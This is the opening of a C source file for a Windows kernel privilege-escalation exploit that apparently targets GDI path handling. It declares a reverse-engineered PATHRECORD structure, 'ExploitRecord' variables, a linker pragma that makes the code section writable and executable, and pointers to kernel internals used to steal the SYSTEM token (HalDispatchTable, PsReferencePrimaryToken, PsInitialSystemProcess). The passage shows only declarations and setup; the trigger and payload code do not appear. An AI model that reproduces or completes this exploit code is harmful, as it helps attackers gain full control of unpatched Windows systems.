#ifndef WIN32_NO_STATUS
# define WIN32_NO_STATUS
#endif
#include <stdio.h>
#include <stdarg.h>
#include <stddef.h>
#include <windows.h>
#include <assert.h>
#ifdef WIN32_NO_STATUS
# undef WIN32_NO_STATUS
#endif
#include <ntstatus.h>

#pragma comment(lib, "gdi32")
#pragma comment(lib, "kernel32")
#pragma comment(lib, "user32")
#pragma comment(lib, "shell32")
#pragma comment(linker, "/SECTION:.text,ERW")

#ifndef PAGE_SIZE
# define PAGE_SIZE 0x1000
#endif

#define MAX_POLYPOINTS 8192
#define MAX_REGIONS 8192
#define CYCLE_TIMEOUT 10000

static POINT       Points[MAX_POLYPOINTS];
static BYTE        PointTypes[MAX_POLYPOINTS];
static HRGN        Regions[MAX_REGIONS];
static ULONG       ComplexPathNumRegion = 0;
static DWORD       ComplexPathFinished = 0;

// Log levels.
typedef enum { L_DEBUG, L_INFO, L_WARN, L_ERROR } LEVEL, *PLEVEL;

BOOL LogMessage(LEVEL Level, PCHAR Format, ...);

// Copied from winddi.h from the DDK
#define PD_BEGINSUBPATH   0x00000001
#define PD_ENDSUBPATH     0x00000002
#define PD_RESETSTYLE     0x00000004
#define PD_CLOSEFIGURE    0x00000008
#define PD_BEZIERS        0x00000010

typedef struct  _POINTFIX
{
    ULONG x;
    ULONG y;
} POINTFIX, *PPOINTFIX;

// Approximated from reverse engineering.
typedef struct _PATHRECORD {
    struct _PATHRECORD *next;
    struct _PATHRECORD *prev;
    ULONG               flags;
    ULONG               count;
    POINTFIX            points[0];
} PATHRECORD, *PPATHRECORD;

PPATHRECORD PathRecord;
PATHRECORD  ExploitRecord;
PPATHRECORD ExploitRecordExit;

enum { SystemModuleInformation = 11 };
enum { ProfileTotalIssues = 2 };

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR  FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

FARPROC NtQuerySystemInformation;
FARPROC NtQueryIntervalProfile;
FARPROC PsReferencePrimaryToken;
FARPROC PsLookupProcessByProcessId;
PULONG  HalDispatchTable;
ULONG   HalQuerySystemInformation;
PULONG  TargetPid;
PVOID  *PsInitialSystemProcess;

VOID elevator_complex_path();

//#define DEBUGTRACE 1

#ifdef DEBUGTRACE
#define dprintf(...) real_dprintf(__VA_ARGS__)
#else
#define dprintf(...) do{}while(0);
#endif

static void real_dprintf(char *format, ...) {
	va_list args;
	char buffer[1024];
	va_start(args,format);
	vsnprintf_s(buffer, sizeof(buffer), sizeof(buffer)-3, format,args);
	strcat_s(buffer, sizeof(buffer), "\r\n");
	OutputDebugStringA(buffer);
}